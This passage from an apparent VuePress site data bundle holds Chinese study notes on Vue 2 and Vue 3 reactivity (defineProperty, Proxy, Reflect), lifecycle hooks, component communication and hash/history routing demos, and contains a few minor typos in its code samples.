Watcher订阅者 Vue2 响应式 缺点 缺点的弥补 Vue3 响应式",content:"# Vue 的响应式原理\n\nVue源码解读\n\n\n# Vue 响应式原理的核⼼就是Observer、Dep、Watcher\n\n一篇异常详细的掘金\n\n * Observer 中进⾏响应式的绑定，监听数据变化，在数据被读的时候，触发 get ⽅法，执⾏ Dep 来收集依赖，也就是收集 Watcher\n * 在数据被改的时候，触发 set ⽅法，通过对应的所有依赖(Watcher)，去执⾏更新。\n\nvue 文档中的原图\n\n\n# 如何监听数据的变化\n\n\n# Observer观察者\n\n简单说就是通过劫持数据，在 setter 中向 Dep（调度中心）添加观察者，在 getter 中通知观察者更新\n\n详细一点Object.defineProperty()\n\n * 对象传入 vue 实例作为 data 选项\n * Vue 将遍历此对象所有的property，通过Object.defineProperty把 property 转化为getter/setter\n * 当 Observer 中对象的属性被访问，则通过 getter 返回值\n * 当 Observer 中对象的属性被编辑修改，则通过 setter 更新 data 中的值\n\n思考三个问题？ 1、Vue2的深度监听 2、对于对象的新增属性，vue如何实现数据绑定 3、如何对数组进行监听，如下代码中有写到\n\n// 模拟触发更新视图\nfunction updateView() {\n    console.log('视图更新')\n}\n\n// 重新定义数组原型\nconst oldArrayProperty = Array.prototype\n// 创建新对象，原型指向 oldArrayProperty ，再扩展新的方法不会影响原型\nconst arrProto = Object.create(oldArrayProperty);\n['push', 'pop', 'shift', 'unshift', 'splice'].forEach(methodName => {\n    arrProto[methodName] = function () {\n        updateView() // 触发视图更新\n        oldArrayProperty[methodName].call(this, ...arguments)\n        // Array.prototype.push.call(this, ...arguments)\n    }\n})\n\n// 重新定义属性，监听起来\nfunction defineReactive(target, key, value) {\n    // 深度监听\n    observer(value)\n    // 核心 API\n    Object.defineProperty(target, key, {\n        get() {\n            return value\n        },\n        set(newValue) {\n            if (newValue !== value) {\n                // 深度监听\n                observer(newValue)\n\n                // 设置新值\n                // 注意，value 一直在闭包中，此处设置完之后，再 get 时也是会获取最新的值\n                value = newValue\n\n                // 触发更新视图\n                updateView()\n            }\n        }\n    })\n}\n// 监听对象属性\nfunction observer(target) {\n    if (typeof target !== 'object' || target === null) {\n        // 不是对象或数组\n        return target\n    }\n    // 污染全局的 Array 原型\n    // Array.prototype.push = function () {\n    //     updateView()\n    //     ...\n    // }\n    if (Array.isArray(target)) {\n        target.__proto__ = arrProto\n    }\n\n    // 重新定义各个属性（for in 也可以遍历数组）\n    for (let key in target) {\n        defineReactive(target, key, target[key])\n    }\n}\n// 准备数据\nconst data = {\n    name: 'zhangsan',\n    age: 18,\n    info: {\n        address: 'shanghai' // 需要深度监听\n    },\n    nums: [10, 20, 30]\n}\n// 监听数据\nobserver(data)\n\n\ndata.name = 'lisi'\ndata.age = 21\ndata.x = '100' // 新增属性，监听不到 —— 所以有 Vue.set\ndelete data.name // 删除属性，监听不到 —— 所有已 Vue.delete\ndata.info.address = '上海' // 深度监听\ndata.nums.push(4) // 监听数组\n\n\n# defineProperty的缺点\n\n 1. 深度监听需要通过递归实现，比如对象内对象多层嵌套的双向绑定需要进行递归\n 2. 无法监听新增属性和删除属性，需要使用Vue.set,Vue.delete\n 3. 无法直接监听数组的一些操作，那为什么我们在使用vue时候是可以监听数组的呢？因为vue对数组的一些方法进行重写，如上代码（为了不污染全局的Array原型，使用Object.create()创建新的对象，新对象中新增编辑的方法不会污染原生的Array）\n\n# 请问vue2源码重写了哪些数组方法\n\n重写了会改变数组自身的方法\n\n[\n  'push',//向数组的末尾添加一个或更多元素，并返回新的长度。\n  'pop',//删除数组的最后一个元素并返回删除的元素。\n  'shift',//    删除并返回数组的第一个元素。\n  'unshift',//向数组的开头添加一个或更多元素，并返回新的长度。\n  'reverse',//反转数组的元素顺序。\n  'sort',//对数组进行排序（可以穿进去一个函数）\n  'splice',//splice(n,m)删除数组的第n个到第m-1个（不包含m个）从数组中添加或删除元素。\n]\n\n\n\n# Dep依赖管理\n\n收集依赖，通知观察者\n\nDep 扮演的角色是调度中心/订阅器，主要的作用就是收集观察者 Watcher 和通知观察者目标更新。每个属性拥有自己的消息订阅器 dep，用于存放所有订阅了该属性的观察者对象，当数据发生改变时，会遍历观察者列表（dep.subs），通过 dep.notify()所有的 watch，让订阅者 watcher 执行自己的 update 逻辑\n\n\n# Watcher订阅者\n\nWatcher 扮演的角色是订阅者，他的主要作用是为观察属性提供回调函数以及收集依赖（如计算属性 computed，vue 会把该属性所依赖数据的 dep 添加到自身的 deps 中），当被观察的值发生变化时，会接收到来自 dep 的通知，从而触发回调函数\n\n\n\n\n# Vue2 响应式\n\n通过 Object.defineProperty API 劫持数据的变化，在数据被访问的时候收集依赖，然后在数据被修改的时候通知依赖更新\n\n\n# 缺点\n\n * Object.defineProperty 只对初始对象里的属性有监听作用，而对新增的属性无效,所以有Vue.$set，$delete\n * 对数组的操作有限,利用索引直接设置一个数组项时,当你修改数组的长度都不是响应式\n * 需要对每个属性进行遍历监听，如果嵌套对象，需要深层监听，造成性能问题\n\n\n# 缺点的弥补\n\n * set、delete方法\n * 重写数组方法\n\n// 数组重写\nconst originalProto = Array.prototype\nconst arrayProto = Object.create(originalProto)\n['push', 'pop', 'shift', 'unshift', 'splice', 'reverse', 'sort'].forEach(method => {\n  arrayProto[method] = function () {\n    originalProto[method].apply(this.arguments)\n    dep.notice()\n  }\n});\n\n\n\n\n# Vue3 响应式\n\nProxy直接可以劫持整个对象，并返回一个新对象，我们可以只操作新的对象达到响应式目的\n\nfunction reactive(obj) {\n  if (typeof obj !== \"object\" && obj != null) {\n    return obj;\n  }\n  const observed = new Proxy(obj, {\n    get(target, key, receiver) {\n      const res = Reflect.get(target, key, receiver);\n      console.log(`获取${key}:${res}`);\n      return res;\n    },\n    set(target, key, value, receiver) {\n      const res = Reflect.set(target, key, value, receiver);\n      console.log(`设置${key}:${value}`);\n      return res;\n    },\n    deleteProperty(target, key) {\n      const res = Reflect.deleteProperty(target, key);\n      console.log(`删除${key}:${res}`);\n      return res;\n    },\n  });\n  return observed;\n}\n",normalizedContent:"# vue 的响应式原理\n\nvue源码解读\n\n\n# vue 响应式原理的核⼼就是observer、dep、watcher\n\n一篇异常详细的掘金\n\n * observer 中进⾏响应式的绑定，监听数据变化，在数据被读的时候，触发 get ⽅法，执⾏ dep 来收集依赖，也就是收集 watcher\n * 在数据被改的时候，触发 set ⽅法，通过对应的所有依赖(watcher)，去执⾏更新。\n\nvue 文档中的原图\n\n\n# 如何监听数据的变化\n\n\n# observer观察者\n\n简单说就是通过劫持数据，在 setter 中向 dep（调度中心）添加观察者，在 getter 中通知观察者更新\n\n详细一点object.defineproperty()\n\n * 对象传入 vue 实例作为 data 选项\n * vue 将遍历此对象所有的property，通过object.defineproperty把 property 转化为getter/setter\n * 当 observer 中对象的属性被访问，则通过 getter 返回值\n * 当 observer 中对象的属性被编辑修改，则通过 setter 更新 data 中的值\n\n思考三个问题？ 1、vue2的深度监听 2、对于对象的新增属性，vue如何实现数据绑定 3、如何对数组进行监听，如下代码中有写到\n\n// 模拟触发更新视图\nfunction updateview() {\n    console.log('视图更新')\n}\n\n// 重新定义数组原型\nconst oldarrayproperty = array.prototype\n// 创建新对象，原型指向 oldarrayproperty ，再扩展新的方法不会影响原型\nconst arrproto = object.create(oldarrayproperty);\n['push', 'pop', 'shift', 'unshift', 'splice'].foreach(methodname => {\n    arrproto[methodname] = function () {\n        updateview() // 触发视图更新\n        oldarrayproperty[methodname].call(this, ...arguments)\n        // array.prototype.push.call(this, ...arguments)\n    }\n})\n\n// 重新定义属性，监听起来\nfunction definereactive(target, key, value) {\n    // 深度监听\n    observer(value)\n    // 核心 api\n    object.defineproperty(target, key, {\n        get() {\n            return value\n        },\n        set(newvalue) {\n            if (newvalue !== value) {\n                // 深度监听\n                observer(newvalue)\n\n                // 设置新值\n                // 注意，value 一直在闭包中，此处设置完之后，再 get 时也是会获取最新的值\n                value = newvalue\n\n                // 触发更新视图\n                updateview()\n            }\n        }\n    })\n}\n// 监听对象属性\nfunction observer(target) {\n    if (typeof target !== 'object' || target === null) {\n        // 不是对象或数组\n        return target\n    }\n    // 污染全局的 array 原型\n    // array.prototype.push = function () {\n    //     updateview()\n    //     ...\n    // }\n    if (array.isarray(target)) {\n        target.__proto__ = arrproto\n    }\n\n    // 重新定义各个属性（for in 也可以遍历数组）\n    for (let key in target) {\n        definereactive(target, key, target[key])\n    }\n}\n// 准备数据\nconst data = {\n    name: 'zhangsan',\n    age: 18,\n    info: {\n        address: 'shanghai' // 需要深度监听\n    },\n    nums: [10, 20, 30]\n}\n// 监听数据\nobserver(data)\n\n\ndata.name = 'lisi'\ndata.age = 21\ndata.x = '100' // 新增属性，监听不到 —— 所以有 vue.set\ndelete data.name // 删除属性，监听不到 —— 所有已 vue.delete\ndata.info.address = '上海' // 深度监听\ndata.nums.push(4) // 监听数组\n\n\n# defineproperty的缺点\n\n 1. 深度监听需要通过递归实现，比如对象内对象多层嵌套的双向绑定需要进行递归\n 2. 无法监听新增属性和删除属性，需要使用vue.set,vue.delete\n 3. 无法直接监听数组的一些操作，那为什么我们在使用vue时候是可以监听数组的呢？因为vue对数组的一些方法进行重写，如上代码（为了不污染全局的array原型，使用object.create()创建新的对象，新对象中新增编辑的方法不会污染原生的array）\n\n# 请问vue2源码重写了哪些数组方法\n\n重写了会改变数组自身的方法\n\n[\n  'push',//向数组的末尾添加一个或更多元素，并返回新的长度。\n  'pop',//删除数组的最后一个元素并返回删除的元素。\n  'shift',//    删除并返回数组的第一个元素。\n  'unshift',//向数组的开头添加一个或更多元素，并返回新的长度。\n  'reverse',//反转数组的元素顺序。\n  'sort',//对数组进行排序（可以穿进去一个函数）\n  'splice',//splice(n,m)删除数组的第n个到第m-1个（不包含m个）从数组中添加或删除元素。\n]\n\n\n\n# dep依赖管理\n\n收集依赖，通知观察者\n\ndep 扮演的角色是调度中心/订阅器，主要的作用就是收集观察者 watcher 和通知观察者目标更新。每个属性拥有自己的消息订阅器 dep，用于存放所有订阅了该属性的观察者对象，当数据发生改变时，会遍历观察者列表（dep.subs），通过 dep.notify()所有的 watch，让订阅者 watcher 执行自己的 update 逻辑\n\n\n# watcher订阅者\n\nwatcher 扮演的角色是订阅者，他的主要作用是为观察属性提供回调函数以及收集依赖（如计算属性 computed，vue 会把该属性所依赖数据的 dep 添加到自身的 deps 中），当被观察的值发生变化时，会接收到来自 dep 的通知，从而触发回调函数\n\n\n\n\n# vue2 响应式\n\n通过 object.defineproperty api 劫持数据的变化，在数据被访问的时候收集依赖，然后在数据被修改的时候通知依赖更新\n\n\n# 缺点\n\n * object.defineproperty 只对初始对象里的属性有监听作用，而对新增的属性无效,所以有vue.$set，$delete\n * 对数组的操作有限,利用索引直接设置一个数组项时,当你修改数组的长度都不是响应式\n * 需要对每个属性进行遍历监听，如果嵌套对象，需要深层监听，造成性能问题\n\n\n# 缺点的弥补\n\n * set、delete方法\n * 重写数组方法\n\n// 数组重写\nconst originalproto = array.prototype\nconst arrayproto = object.create(originalproto)\n['push', 'pop', 'shift', 'unshift', 'splice', 'reverse', 'sort'].foreach(method => {\n  arrayproto[method] = function () {\n    originalproto[method].apply(this.arguments)\n    dep.notice()\n  }\n});\n\n\n\n\n# vue3 响应式\n\nproxy直接可以劫持整个对象，并返回一个新对象，我们可以只操作新的对象达到响应式目的\n\nfunction reactive(obj) {\n  if (typeof obj !== \"object\" && obj != null) {\n    return obj;\n  }\n  const observed = new proxy(obj, {\n    get(target, key, receiver) {\n      const res = reflect.get(target, key, receiver);\n      console.log(`获取${key}:${res}`);\n      return res;\n    },\n    set(target, key, value, receiver) {\n      const res = reflect.set(target, key, value, receiver);\n      console.log(`设置${key}:${value}`);\n      return res;\n    },\n    deleteproperty(target, key) {\n      const res = reflect.deleteproperty(target, key);\n      console.log(`删除${key}:${res}`);\n      return res;\n    },\n  });\n  return observed;\n}\n",charsets:{cjk:!0}},{title:"Vue生命周期",frontmatter:{title:"Vue生命周期"},regularPath:"/webstudy/Vue2/Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",relativePath:"webstudy/Vue2/Vue生命周期.md",key:"v-7ee75026",path:"/webstudy/Vue2/Vue%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.html",headers:[{level:2,title:"每个钩子都做了什么",slug:"每个钩子都做了什么",normalizedTitle:"每个钩子都做了什么",charIndex:14},{level:2,title:"Vue3和Vue2比较",slug:"vue3和vue2比较",normalizedTitle:"vue3和vue2比较",charIndex:373},{level:2,title:"父子组件生命周期顺序",slug:"父子组件生命周期顺序",normalizedTitle:"父子组件生命周期顺序",charIndex:643},{level:3,title:"初始、挂载阶段",slug:"初始、挂载阶段",normalizedTitle:"初始、挂载阶段",charIndex:658},{level:3,title:"更新阶段",slug:"更新阶段",normalizedTitle:"更新阶段",charIndex:798},{level:3,title:"销毁阶段",slug:"销毁阶段",normalizedTitle:"销毁阶段",charIndex:871}],headersStr:"每个钩子都做了什么 Vue3和Vue2比较 父子组件生命周期顺序 初始、挂载阶段 更新阶段 销毁阶段",content:"# Vue生命周期\n\n\n# 每个钩子都做了什么\n\n * beforeCreate:创建实例之前执行，元素和数据都是undefined。\n * created:实例初始化完成后执行，可以访问数据或方法，不能操作DOM。可以做一些初始数据的获取，发送ajax。\n * beforeMount:挂载前执行，虚拟DOM创建完成，即将开始渲染。\n * Mounted:页面渲染完成后执行，可以对DOM进行操作。\n * beforeUpdate：数据发生更新时执行。此时vue实例中的数据是最新的，但是页面数据仍是旧值。\n * updated：数据发生更新导致的 DOM 重新渲染完成时执行。\n * beforeDestroy：实例销毁前执行。实例仍然可以使用，一般在这个时候清除定时器或者解除事件绑定等。\n * destroyed：实例销毁完成。\n\n\n# Vue3和Vue2比较\n\n * beforeCreate===>setup()\n * created =======> setup()\n * beforeMount ===> onBeforeMount\n * mounted =======> onMounted\n * beforeUpdate ===> onBeforeUpdate\n * updated =======>onUpdated\n * beforeDestroy ==> onBeforeUnmount\n * destroyed =====> onUnmounted\n\n\n# 父子组件生命周期顺序\n\n\n# 初始、挂载阶段\n\n父组件beforeCreate => 父组件created => 父组件beforeMount => 子组件beforeCreate => 子组件created => 子组件beforeMount => 子组件mounted => 父组件mounted\n\n\n# 更新阶段\n\n父组件beforeUpdate => 子组件beforeUpdate => 子组件updated => 父组件updated\n\n\n# 销毁阶段\n\n父组件beforeDestroy => 子组件beforeDestroy => 子组件destroyed => 父组件destroyed",normalizedContent:"# vue生命周期\n\n\n# 每个钩子都做了什么\n\n * beforecreate:创建实例之前执行，元素和数据都是undefined。\n * created:实例初始化完成后执行，可以访问数据或方法，不能操作dom。可以做一些初始数据的获取，发送ajax。\n * beforemount:挂载前执行，虚拟dom创建完成，即将开始渲染。\n * mounted:页面渲染完成后执行，可以对dom进行操作。\n * beforeupdate：数据发生更新时执行。此时vue实例中的数据是最新的，但是页面数据仍是旧值。\n * updated：数据发生更新导致的 dom 重新渲染完成时执行。\n * beforedestroy：实例销毁前执行。实例仍然可以使用，一般在这个时候清除定时器或者解除事件绑定等。\n * destroyed：实例销毁完成。\n\n\n# vue3和vue2比较\n\n * beforecreate===>setup()\n * created =======> setup()\n * beforemount ===> onbeforemount\n * mounted =======> onmounted\n * beforeupdate ===> onbeforeupdate\n * updated =======>onupdated\n * beforedestroy ==> onbeforeunmount\n * destroyed =====> onunmounted\n\n\n# 父子组件生命周期顺序\n\n\n# 初始、挂载阶段\n\n父组件beforecreate => 父组件created => 父组件beforemount => 子组件beforecreate => 子组件created => 子组件beforemount => 子组件mounted => 父组件mounted\n\n\n# 更新阶段\n\n父组件beforeupdate => 子组件beforeupdate => 子组件updated => 父组件updated\n\n\n# 销毁阶段\n\n父组件beforedestroy => 子组件beforedestroy => 子组件destroyed => 父组件destroyed",charsets:{cjk:!0}},{title:"中间件",frontmatter:{title:"中间件"},regularPath:"/webstudy/Nodejs/%E4%B8%AD%E9%97%B4%E4%BB%B6.html",relativePath:"webstudy/Nodejs/中间件.md",key:"v-4e60d9bf",path:"/webstudy/Nodejs/%E4%B8%AD%E9%97%B4%E4%BB%B6.html",headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"组件通讯",frontmatter:{title:"组件通讯"},regularPath:"/webstudy/Vue2/%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF.html",relativePath:"webstudy/Vue2/组件通讯.md",key:"v-1cadf89a",path:"/webstudy/Vue2/%E7%BB%84%E4%BB%B6%E9%80%9A%E8%AE%AF.html",headers:[{level:2,title:"组件通讯",slug:"组件通讯",normalizedTitle:"组件通讯",charIndex:2},{level:3,title:"provide和inject",slug:"provide和inject",normalizedTitle:"provide和inject",charIndex:204}],headersStr:"组件通讯 provide和inject",content:"# 组件通讯\n\n * 1、props/$emit\n * 2、自定义事件(事件总线) bus.$emit/bus.$emit/bus.$off event-emitter一个库，Vue3开箱即用\n * 3、$attrs/$listeners(Vue3已移出) 属于props/emits的候补\n * 4、$parent\n * 5、$refs\n * 6、provide/inject\n * 7、vuex\n\n\n# provide和inject\n\n如何传递一些动态的数据？\n\n//provide写成函数的形式\nprovide(){\n  return {\n    info:computed(()=>{\n      this.name\n    })\n  }\n} \n\ninject:['info']\n",normalizedContent:"# 组件通讯\n\n * 1、props/$emit\n * 2、自定义事件(事件总线) bus.$emit/bus.$emit/bus.$off event-emitter一个库，vue3开箱即用\n * 3、$attrs/$listeners(vue3已移出) 属于props/emits的候补\n * 4、$parent\n * 5、$refs\n * 6、provide/inject\n * 7、vuex\n\n\n# provide和inject\n\n如何传递一些动态的数据？\n\n//provide写成函数的形式\nprovide(){\n  return {\n    info:computed(()=>{\n      this.name\n    })\n  }\n} \n\ninject:['info']\n",charsets:{cjk:!0}},{title:"vue-router",frontmatter:{},regularPath:"/webstudy/Vue2/vue-router.html",relativePath:"webstudy/Vue2/vue-router.md",key:"v-0424bdf4",path:"/webstudy/Vue2/vue-router.html",headers:[{level:2,title:"hash实现路由",slug:"hash实现路由",normalizedTitle:"hash实现路由",charIndex:69},{level:2,title:"history实现路由",slug:"history实现路由",normalizedTitle:"history实现路由",charIndex:1163}],headersStr:"hash实现路由 history实现路由",content:'# vue-router\n\nvue中的router的底层就是通过浏览器的onhashChange，onpopstate等时间实现\n\n\n# hash实现路由\n\n * hash的变化会触发网页的跳转，及浏览器的前进和后退\n * hash的变化不会刷新页面，这是SPA需要的特点，让这个网页看起来像一个独立的应用，页面内部的刷新通过框架的钩子或者特定方法完成\n * hash不会提交到server端（url中的#在浏览器端的接口请求中不会存在\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="X-UA-Compatible" content="ie=edge">\n    <title>hash test</title>\n</head>\n<body>\n    <p>hash test</p>\n    <button id="btn1">修改 hash</button>\n\n    <script>\n        // hash 变化，包括：\n        // a. JS 修改 url\n        // b. 手动修改 url 的 hash\n        // c. 浏览器前进、后退\n        window.onhashchange = (event) => {\n            console.log(\'old url\', event.oldURL)\n            console.log(\'new url\', event.newURL)\n\n            console.log(\'hash:\', location.hash)\n        }\n        // 页面初次加载，获取 hash\n        document.addEventListener(\'DOMContentLoaded\', () => {\n            console.log(\'hash:\', location.hash)\n        })\n        // JS 修改 url\n        document.getElementById(\'btn1\').addEventListener(\'click\', () => {\n            location.href = \'#/user\'\n        })\n    <\/script>\n</body>\n</html>\n\n\n\n# history实现路由\n\n * 用url规范的路由，跳转不刷新页面\n * hisory.pushState\n * window.onpopstate\n\n<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <meta http-equiv="X-UA-Compatible" content="ie=edge" />\n    <title>history API test</title>\n  </head>\n  <body>\n    <p>history API test</p>\n    <button id="btn1">修改 url</button>\n\n    <script>\n      // 页面初次加载，获取 path\n      document.addEventListener("DOMContentLoaded", () => {\n        console.log("load", location.pathname);\n      });\n\n      // 打开一个新的路由\n      // 【注意】用 pushState 方式，浏览器不会刷新页面\n      document.getElementById("btn1").addEventListener("click", () => {\n        const state = { name: "page1" };\n        console.log("切换路由到", "page1");\n        window.history.pushState(state, "", "page1"); // 重要！！\n      });\n      // 监听浏览器前进、后退\n      window.onpopstate = (event) => {\n        console.log("event :>> ", event);\n        console.log("onpopstate", event.state, location.pathname);\n      };\n    <\/script>\n  </body>\n</html>\n\n',normalizedContent:'# vue-router\n\nvue中的router的底层就是通过浏览器的onhashchange，onpopstate等时间实现\n\n\n# hash实现路由\n\n * hash的变化会触发网页的跳转，及浏览器的前进和后退\n * hash的变化不会刷新页面，这是spa需要的特点，让这个网页看起来像一个独立的应用，页面内部的刷新通过框架的钩子或者特定方法完成\n * hash不会提交到server端（url中的#在浏览器端的接口请求中不会存在\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <meta http-equiv="x-ua-compatible" content="ie=edge">\n    <title>hash test</title>\n</head>\n<body>\n    <p>hash test</p>\n    <button id="btn1">修改 hash</button>\n\n    <script>\n        // hash 变化，包括：\n        // a. js 修改 url\n        // b. 手动修改 url 的 hash\n        // c. 浏览器前进、后退\n        window.onhashchange = (event) => {\n            console.log(\'old url\', event.oldurl)\n            console.log(\'new url\', event.newurl)\n\n            console.log(\'hash:\', location.hash)\n        }\n        // 页面初次加载，获取 hash\n        document.addeventlistener(\'domcontentloaded\', () => {\n            console.log(\'hash:\', location.hash)\n        })\n        // js 修改 url\n        document.getelementbyid(\'btn1\').addeventlistener(\'click\', () => {\n            location.href = \'#/user\'\n        })\n    <\/script>\n</body>\n</html>\n\n\n\n# history实现路由\n\n * 用url规范的路由，跳转不刷新页面\n * hisory.pushstate\n * window.onpopstate\n\n<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8" />\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    <meta http-equiv="x-ua-compatible" content="ie=edge" />\n    <title>history api test</title>\n  </head>\n  <body>\n    <p>history api test</p>\n    <button id="btn1">修改 url</button>\n\n    <script>\n      // 页面初次加载，获取 path\n      document.addeventlistener("domcontentloaded", () => {\n        console.log("load", location.pathname);\n      });\n\n      // 打开一个新的路由\n      // 【注意】用 pushstate 方式，浏览器不会刷新页面\n      document.getelementbyid("btn1").addeventlistener("click", () => {\n        const state = { name: "page1" };\n        console.log("切换路由到", "page1");\n        window.history.pushstate(state, "", "page1"); // 重要！！\n      });\n      // 监听浏览器前进、后退\n      window.onpopstate = (event) => {\n        console.log("event :>> ", event);\n        console.log("onpopstate", event.state, location.pathname);\n      };\n    <\/script>\n  </body>\n</html>\n\n',charsets:{cjk:!0}},{title:"Proxy",frontmatter:{},regularPath:"/webstudy/Vue3/Proxy.html",relativePath:"webstudy/Vue3/Proxy.md",key:"v-7ea5908c",path:"/webstudy/Vue3/Proxy.html",headers:[{level:2,title:"Proxy demo",slug:"proxy-demo",normalizedTitle:"proxy demo",charIndex:12},{level:2,title:"实现 Proxy-Observe",slug:"实现-proxy-observe",normalizedTitle:"实现 proxy-observe",charIndex:1425},{level:3,title:"代码",slug:"代码",normalizedTitle:"代码",charIndex:1446},{level:3,title:"Proxy 优势",slug:"proxy-优势",normalizedTitle:"proxy 优势",charIndex:3096},{level:2,title:"Reflect（反射）",slug:"reflect-反射",normalizedTitle:"reflect（反射）",charIndex:3152}],headersStr:"Proxy demo 实现 Proxy-Observe 代码 Proxy 优势 Reflect（反射）",content:'# Proxy\n\n\n# Proxy demo\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset="UTF-8" />\n    <meta\n      name="viewport"\n      content="width=device-width, initial-scale=1, minimum-scale=1,maximum-scale=1,user-scalable=no"\n    />\n    <meta name="format-detection" content="telephone=no" />\n    <title>Observe demo</title>\n  </head>\n  <body>\n    <script src="./proxy-demo.js">\n      //如何监听Array\n      // const data = [1,2,3,4]\n      //如何监听Object\n      const data = {\n        a:1,\n        b:2\n      }\n      const proxyData = new Proxy(data,{\n        get(target, key, receiver) {\n          // 只处理本身（非原型的）属性\n          const ownKeys = Reflect.ownKeys(target)\n          if(ownKeys.includes(key)){\n            console.log(\'get\', key) // 此处监听\n          }\n          const result = Reflect.get(target, key, receiver)\n          console.log(\'result :>> \', result);\n          return result // 返回结果\n        },\n        set(target, key, val, receiver) {\n          // 重复的数据，不处理\n          if (val === target[key]) {\n            return true\n          }\n          const result = Reflect.set(target, key, val, receiver)\n          console.log(\'result\', result) // true\n          return result // 是否设置成功\n        },\n        deleteProperty(target, key) {\n          const result = Reflect.deleteProperty(target, key)\n          console.log(\'result\', result) // true\n          return result // 是否删除成功\n        }\n      })\n    <\/script>\n  </body>\n</html>\n\n\n\n# 实现 Proxy-Observe\n\n\n# 代码\n\n// 创建响应式\nfunction reactive(target = {}) {\n  if (typeof target !== "object" || target == null) {\n    // 不是对象或数组，则返回\n    return target;\n  }\n\n  // 代理配置\n  const proxyConf = {\n    get(target, key, receiver) {\n      // 只处理本身（非原型的）属性\n      const ownKeys = Reflect.ownKeys(target);\n      //判断当前target是否有此属性\n      if (ownKeys.includes(key)) {\n        console.log("get", key); // 监听\n      }\n      const result = Reflect.get(target, key, receiver);\n      // 深度监听\n      // 性能如何提升的？\n      // vue2，一开始就直接将所有数据递归完成实现响应式\n      // 而vue3中，get到哪一个层级之后才进行递归，是一种惰性的操作\n      return reactive(result);\n    },\n    set(target, key, val, receiver) {\n      // 重复的数据，不处理\n      if (val === target[key]) {\n        return true;\n      }\n      //如何判断新增属性\n      //根据Reflect.ownKeys，通过比较现有的，来识别是否是新增的属性\n      const ownKeys = Reflect.ownKeys(target);\n      if (ownKeys.includes(key)) {\n        console.log("已有的 key", key);\n      } else {\n        console.log("新增的 key", key);\n      }\n\n      const result = Reflect.set(target, key, val, receiver);\n      console.log("set", key, val);\n      // console.log(\'result\', result) // true\n      return result; // 是否设置成功\n    },\n    deleteProperty(target, key) {\n      const result = Reflect.deleteProperty(target, key);\n      console.log("delete property", key);\n      // console.log(\'result\', result) // true\n      return result; // 是否删除成功\n    },\n  };\n\n  // 生成代理对象\n  const observed = new Proxy(target, proxyConf);\n  return observed;\n}\n\n// 测试数据\nconst data = {\n  name: "hahaha",\n  age: 20,\n  address: {\n    a: {\n      b: {\n        c: {\n          d: "abc121211",\n        },\n      },\n    },\n  },\n};\n//实现监听数据\nconst proxyData = reactive(data);\n\n\n\n# Proxy 优势\n\n * 深度监听，性能更好\n * 可以监听数组变化\n * 可以监听新增和删除对象属性\n\n\n# Reflect（反射）\n\nconst obj = { a: 1, b: 2, c: 3 };\n//检查对象中是否有某个属性\n"a" in obj; //true\nReflect.has(obj, "a"); //true\n//删除某属性\ndelete obj.a;\nReflect.deleteProperty(obj, "a"); //建议使用此Api\n//获取属性\nObject.getOwnPropertyNames(obj); ////[\'a\',\'b\',\'c\']\nReflect.ownKeys(obj); //[\'a\',\'b\',\'c\']\n',normalizedContent:'# proxy\n\n\n# proxy demo\n\n<!doctype html>\n<html>\n  <head>\n    <meta charset="utf-8" />\n    <meta\n      name="viewport"\n      content="width=device-width, initial-scale=1, minimum-scale=1,maximum-scale=1,user-scalable=no"\n    />\n    <meta name="format-detection" content="telephone=no" />\n    <title>observe demo</title>\n  </head>\n  <body>\n    <script src="./proxy-demo.js">\n      //如何监听array\n      // const data = [1,2,3,4]\n      //如何监听object\n      const data = {\n        a:1,\n        b:2\n      }\n      const proxydata = new proxy(data,{\n        get(target, key, receiver) {\n          // 只处理本身（非原型的）属性\n          const ownkeys = reflect.ownkeys(target)\n          if(ownkeys.includes(key)){\n            console.log(\'get\', key) // 此处监听\n          }\n          const result = reflect.get(target, key, receiver)\n          console.log(\'result :>> \', result);\n          return result // 返回结果\n        },\n        set(target, key, val, receiver) {\n          // 重复的数据，不处理\n          if (val === target[key]) {\n            return true\n          }\n          const result = reflect.set(target, key, val, receiver)\n          console.log(\'result\', result) // true\n          return result // 是否设置成功\n        },\n        deleteproperty(target, key) {\n          const result = reflect.deleteproperty(target, key)\n          console.log(\'result\', result) // true\n          return result // 是否删除成功\n        }\n      })\n    <\/script>\n  </body>\n</html>\n\n\n\n# 实现 proxy-observe\n\n\n# 代码\n\n// 创建响应式\nfunction reactive(target = {}) {\n  if (typeof target !== "object" || target == null) {\n    // 不是对象或数组，则返回\n    return target;\n  }\n\n  // 代理配置\n  const proxyconf = {\n    get(target, key, receiver) {\n      // 只处理本身（非原型的）属性\n      const ownkeys = reflect.ownkeys(target);\n      //判断当前target是否有此属性\n      if (ownkeys.includes(key)) {\n        console.log("get", key); // 监听\n      }\n      const result = reflect.get(target, key, receiver);\n      // 深度监听\n      // 性能如何提升的？\n      // vue2，一开始就直接将所有数据递归完成实现响应式\n      // 而vue3中，get到哪一个层级之后才进行递归，是一种惰性的操作\n      return reactive(result);\n    },\n    set(target, key, val, receiver) {\n      // 重复的数据，不处理\n      if (val === target[key]) {\n        return true;\n      }\n      //如何判断新增属性\n      //根据reflect.ownkeys，通过比较现有的，来识别是否是新增的属性\n      const ownkeys = reflect.ownkeys(target);\n      if (ownkeys.includes(key)) {\n        console.log("已有的 key", key);\n      } else {\n        console.log("新增的 key", key);\n      }\n\n      const result = reflect.set(target, key, val, receiver);\n      console.log("set", key, val);\n      // console.log(\'result\', result) // true\n      return result; // 是否设置成功\n    },\n    deleteproperty(target, key) {\n      const result = reflect.deleteproperty(target, key);\n      console.log("delete property", key);\n      // console.log(\'result\', result) // true\n      return result; // 是否删除成功\n    },\n  };\n\n  // 生成代理对象\n  const observed = new proxy(target, proxyconf);\n  return observed;\n}\n\n// 测试数据\nconst data = {\n  name: "hahaha",\n  age: 20,\n  address: {\n    a: {\n      b: {\n        c: 